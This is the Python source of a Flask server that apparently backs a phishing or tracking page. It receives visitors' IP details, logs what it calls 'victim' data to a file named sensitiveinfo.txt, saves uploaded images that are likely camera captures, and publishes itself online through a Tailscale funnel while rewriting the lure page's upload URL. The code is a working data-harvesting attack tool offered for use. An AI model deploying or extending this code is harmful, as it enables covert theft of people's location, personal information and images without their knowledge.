from colorama import Fore, Back, Style
from flask import Flask, render_template, url_for, request, jsonify, Response
from werkzeug.utils import secure_filename
import time
import os
import subprocess
import threading
import signal
import sys
import shutil
import logging
import re

# Setup image directory
IMAGE_DIR = 'image'
if not os.path.exists(IMAGE_DIR):
    os.makedirs(IMAGE_DIR)

app = Flask(__name__)

# Silence Flask logs
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

@app.route('/')
def index():
    return Response(open('index.html').read(), mimetype="text/html")

@app.route('/ipinfo', methods=['POST'])
def ipinfos():
    iplogs = request.get_json()
    with open('ipinfo.txt', 'a') as f:
        f.write(f"\n{iplogs}\n")
    print(Fore.MAGENTA + "----------------------------------------------------")
    print(Fore.RED + "Ip Logs saved to **ipinfo.txt**")
    print(Fore.MAGENTA + "----------------------------------------------------" + Style.RESET_ALL)
    return jsonify({'processed': 'true'})

@app.route('/process_qtc', methods=['POST'])
def getvictimlogs():
    logs = request.get_json()
    with open('sensitiveinfo.txt', 'a') as log:
        log.write(f"\n{logs}\n")
    print(logs)
    print(Fore.MAGENTA + "----------------------------------------------------")
    print(Fore.RED + "Victim Logs saved  to **sensitiveinfo.txt**")
    print(Fore.MAGENTA + "----------------------------------------------------" + Style.RESET_ALL)
    return jsonify({'processed': 'true'})

@app.route('/image', methods=['POST'])
def image():
    if 'image' not in request.files:
        return Response("No image part in the request", status=400)

    file = request.files['image']
    if file.filename == '':
        return Response("No selected file", status=400)

    if file:
        filename = f"{time.strftime('%Y%m%d-%H%M%S')}_{secure_filename(file.filename)}"
        full_path = os.path.join(IMAGE_DIR, filename)
        file.save(full_path)
        print(Fore.YELLOW + f"Image saved successfully at {full_path}" + Style.RESET_ALL)
        return Response(f"{filename} saved", status=200)
    else:
        return Response("Invalid file", status=400)

def check_tailscale():
    print("[+] Checking if Tailscale is installed...")
    if shutil.which("tailscale") is None:
        print("[!] Tailscale is not installed.")
        choice = input("Do you want to install Tailscale now? (y/n): ").strip().lower()
        if choice == 'y':
            print("[+] Installing Tailscale...")
            subprocess.run(['curl', '-fsSL', 'https://tailscale.com/install.sh', '-o', 'install_tailscale.sh'], check=True)
            subprocess.run(['sudo', 'bash', 'install_tailscale.sh'], check=True)
            print("[+] Tailscale installation completed.")
        else:
            print("[!] Skipping Tailscale installation. The app might not work as intended.")
            return False
    else:
        print("[+] Tailscale is already installed.")

    print("\n[+] To authenticate Tailscale, open this URL in your browser:")
    print("    https://login.tailscale.com")
    input("[*] Press Enter after you have authenticated Tailscale to continue...")
    return True

def update_index_html_with_url(url, index_file_path='index.html'):
    try:
        url = url.rstrip('/')
        with open(index_file_path, 'r') as file:
            content = file.read()

        new_content = re.sub(
            r"(xhr\\.open\\(\\s*'POST',\\s*')[^']+('\s*,\\s*true\\s*\\);)",
            rf"\\1{url}/image\\2",
            content
        )

        with open(index_file_path, 'w') as file:
            file.write(new_content)

        print(f"[+] Updated {index_file_path} with correct Tailscale URL.")
    except Exception as e:
        print(f"[!] Failed to update {index_file_path}: {e}")

def start_tailscale_funnel(port=8080):
    print(f"[~] Starting Tailscale funnel on port {port}...")
    funnel_proc = subprocess.Popen(['sudo', 'tailscale', 'funnel', str(port)], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    funnel_url = None
    for _ in range(10):
        line = funnel_proc.stdout.readline()
        if not line:
            time.sleep(1)
            continue
        print(line.strip())
        if 'https://' in line and '.ts.net' in line:
            funnel_url = line.strip()
            break

    if funnel_url:
        print(f"[*] Tailscale Tunnel URL: {funnel_url}")
        update_index_html_with_url(funnel_url)
        print("[+] Updated index.html with the Tailscale URL.")
    else:
        print("[!] Could not find Tailscale funnel URL.")

    return funnel_proc

if __name__ == "__main__":
    try:
        user_port = input("Enter the port you want to run the Flask app on (default 8080): ").strip()
        port = int(user_port) if user_port else 8080
    except ValueError:
        print("[!] Invalid port number. Using default port 8080.")
        port = 8080

    if not check_tailscale():
        print("[!] Tailscale check/install failed or skipped. Exiting.")
        sys.exit(1)

    funnel_process = start_tailscale_funnel(port)

    try:
        app.run(debug=False, host='0.0.0.0', port=port)
    except KeyboardInterrupt:
        print("\n[!] Interrupt received, stopping Tailscale funnel...")
        funnel_process.terminate()
        sys.exit(0)
